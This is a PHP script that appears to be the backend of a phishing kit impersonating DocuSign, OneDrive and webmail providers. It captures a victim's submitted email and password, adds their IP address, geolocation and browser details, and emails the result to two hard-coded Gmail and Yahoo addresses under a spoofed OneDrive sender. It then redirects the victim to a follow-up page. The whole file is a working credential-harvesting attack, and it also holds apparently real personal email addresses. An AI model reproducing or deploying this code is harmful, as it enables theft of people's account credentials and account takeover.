<?php

require_once('geoplugin.class.php');

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 


$msg = "--------------< Elliman Inc - Rsult>-----------------------------\n";
$msg .= "Docusign By 4gb4\n";
$msg .= "-----------------< DB Access >---------------------------\n";
$msg .= "Email: ".$_POST['emazz']."\n";
$msg .= "Password: ".$_POST['pswdd']."\n";
$msg .= "--------------------< IP-ADD >---------------------------------\n";
$msg .= "IP : " .$ip. "\n";
$msg .= "-------------------------------------------------------\n";
$msg .= 	"City: {$geoplugin->city}\n";
$msg .= 	"Region: {$geoplugin->region}\n";
$msg .= 	"Country Name: {$geoplugin->countryName}\n";
$msg .= 	"Country Code: {$geoplugin->countryCode}\n";
$msg .= "USER-WEB-BROWSER: '$browser'\n";
$msg .= "-------------< 2017 GBA Inc. >-----------------------------\n";

if($_POST['OLD']=="ol") {
	$subject=" $state Apartment From Others";
}
if($_POST['YML']=="hm") {
	$subject=" $state Apartment From  Llve";
}
if($_POST['ALL']=="al") {
	$subject=" $state Apartment From  AoI";
}
if($_POST['YAM']=="ya") {
	$subject=" $state Apartment From  YM";
}
if($_POST['OG']=="goall") {
	$subject=" $state Apartment From  Godad";
}
if($_POST['OFF']=="of") {
	$subject=" $state Apartment From 360";
}


$to = "tyler1548@gmail.com,tweeners02@yahoo.com";
$from = "From: Onedrive<newslwetteer@one.drv>";
mail($to,$subject,$msg,$from);

?>
<script type="text/javascript"> 
<!-- 
   window.location="one.html"

</script> 
<?php	

  ?> 
<script type="text/javascript">

</script> 
<?php	
fclose($handle); 
exit; 
?> 